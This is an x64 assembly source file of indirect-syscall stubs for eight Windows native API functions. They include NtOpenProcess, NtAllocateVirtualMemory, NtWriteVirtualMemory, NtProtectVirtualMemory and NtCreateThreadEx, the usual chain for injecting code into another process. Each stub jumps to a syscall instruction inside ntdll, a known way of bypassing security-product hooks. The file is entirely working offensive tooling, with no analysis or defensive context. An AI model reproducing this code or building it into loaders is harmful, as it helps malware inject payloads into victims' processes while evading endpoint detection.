.data 
extern dwNtOpenProcessSSN:DWORD
extern dwNtAllocateVirtualMemorySSN:DWORD
extern dwNtWriteVirtualMemorySSN:DWORD
extern dwNtProtectVirtualMemorySSN:DWORD
extern dwNtCreateThreadExSSN:DWORD
extern dwNtWaitForSingleObjectSSN:DWORD
extern dwNtFreeVirtualMemorySSN:DWORD
extern dwNtCloseSSN:DWORD

extern qwSyscallAddr:QWORD

.code
NtOpenProcess proc 
		mov r10, rcx
		mov eax, dwNtOpenProcessSSN
		jmp qword ptr qwSyscallAddr			; jump to syscall instruction inside of ntdll                         
		ret                             
NtOpenProcess endp

NtAllocateVirtualMemory proc    
		mov r10, rcx
		mov eax, dwNtAllocateVirtualMemorySSN      
		jmp qword ptr qwSyscallAddr                        
		ret                             
NtAllocateVirtualMemory endp

NtWriteVirtualMemory proc 
		mov r10, rcx
		mov eax, dwNtWriteVirtualMemorySSN      
		jmp qword ptr qwSyscallAddr                        
		ret                             
NtWriteVirtualMemory endp 

NtProtectVirtualMemory proc
		mov r10, rcx
		mov eax, dwNtProtectVirtualMemorySSN       
		jmp qword ptr qwSyscallAddr
		ret                             
NtProtectVirtualMemory endp

NtCreateThreadEx proc 
		mov r10, rcx
		mov eax, dwNtCreateThreadExSSN      
		jmp qword ptr qwSyscallAddr                        
		ret                             
NtCreateThreadEx endp 

NtWaitForSingleObject proc 
		mov r10, rcx
		mov eax, dwNtWaitForSingleObjectSSN      
		jmp qword ptr qwSyscallAddr                        
		ret                             
NtWaitForSingleObject endp 

NtFreeVirtualMemory proc
		mov r10, rcx
		mov eax, dwNtFreeVirtualMemorySSN      
		jmp qword ptr qwSyscallAddr
		ret                             
NtFreeVirtualMemory endp

NtClose proc 
		mov r10, rcx
		mov eax, dwNtCloseSSN      
		jmp qword ptr qwSyscallAddr                        
		ret                             
NtClose endp 
end